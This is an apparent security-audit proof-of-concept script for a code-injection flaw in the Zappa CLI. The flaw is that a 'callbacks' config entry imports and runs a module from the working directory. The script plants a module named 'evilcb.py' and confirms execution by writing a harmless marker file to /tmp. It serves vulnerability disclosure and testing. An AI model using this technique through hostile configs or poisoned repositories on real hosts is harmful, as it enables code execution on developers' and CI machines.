#!/usr/bin/env python3
"""VULN-014 — `callbacks`/`prebuild_script` config imports & calls a module from cwd (local RCE).

Vulnerable code : targets/Zappa/zappa/cli.py:2554-2593 (callback; fires at :650 on read-only commands)
                  targets/Zappa/zappa/cli.py:3391-3431 (prebuild_script; merged VULN-015)
Vulnerability   : CWE-94 Code Injection from configuration.
Surface         : C (deploy host — hostile/shared zappa_settings config).

Mechanism (plain English)
-------------------------
`ZappaCLI.callback(position)` reads `self.stage_config["callbacks"][position]` — a
dotted path — and loads that module *from the current working directory*, then
calls the named function passing the CLI object:

    (mod_path, cb_func_name) = callback.rsplit(".", 1)
    working_dir_importer = pkgutil.get_importer(os.getcwd())
    module_ = working_dir_importer.find_spec(mod_name).loader.load_module(mod_name)
    cb_func = getattr(module_, cb_func_name)
    cb_func(self)                                   # <-- attacker code runs

There is no allow-list. Callbacks fire on ordinary (even read-only) commands
(`self.callback("settings")` at cli.py:650), so merely running `zappa status`
against a hostile config executes attacker code on the deploy/CI host.

Exploitation idea
-----------------
A cloned third-party project (or a poisoned shared config) ships
`callbacks: {"settings": "evilcb.pwn"}` plus an `evilcb.py` in the repo. Running
any Zappa command imports `evilcb` from cwd and calls `pwn(cli)`.

What a successful run proves
----------------------------
Driving the real `callback()` with a hostile config imports the planted module
from cwd and executes its function (writes a marker file).
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, lab_python, log, verdict

VULN = "VULN-014"

# Plant an evilcb.py in a temp cwd, then drive the real ZappaCLI.callback().
_DRIVER = r"""
import json, os, secrets, tempfile
import zappa.cli as cli
class T(cli.ZappaCLI):
    @property
    def stage_config(self): return self._sc

sfx = secrets.token_hex(4)
marker = "/tmp/vuln014_rce_%s" % sfx
work = tempfile.mkdtemp(prefix="hostile_repo_")
# The attacker-controlled module that ships in the (hostile/shared) project.
with open(os.path.join(work, "evilcb.py"), "w") as f:
    f.write("def pwn(zappa_cli):\n    open(%r, 'w').write('RCE via callbacks on deploy host')\n" % marker)

old = os.getcwd(); os.chdir(work)             # simulate running `zappa <cmd>` inside the cloned repo
try:
    t = T.__new__(T)
    t._sc = {"callbacks": {"settings": "evilcb.pwn"}}   # hostile config
    t.callback("settings")                    # <-- REAL target code: import from cwd + call
finally:
    os.chdir(old)
print(json.dumps({"marker": marker, "executed": os.path.exists(marker),
                  "content": open(marker).read() if os.path.exists(marker) else None}))
"""


def main():
    banner(VULN, "callbacks config imports+calls a module from cwd (local RCE)",
           "zappa/cli.py:2554-2593 callback() (fires on read-only commands via :650)")

    log("STEP", "planting evilcb.py in a hostile project cwd and running the real callback('settings')")
    cp = lab_python(_DRIVER)
    res = json.loads(cp.stdout.decode().strip().splitlines()[-1])
    log("INFO", f"callback executed = {res['executed']}; marker content = {res['content']!r}")

    if res["executed"] and res["content"]:
        log("PROOF", "the config-named `evilcb.pwn` was imported from the working directory and CALLED, "
                     "writing a marker file — running any Zappa command against a hostile/shared config "
                     "executes attacker code on the deploy/CI host, no allow-list.")
        log("OK", "exploit confirmed — callbacks config -> local code execution")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — hostile `callbacks` config runs attacker code from cwd")
        return 0
    log("FAIL", f"executed={res['executed']}")
    verdict("FAILED", f"{VULN}: FAILED — callback did not execute the planted module")
    return 1


if __name__ == "__main__":
    sys.exit(main())
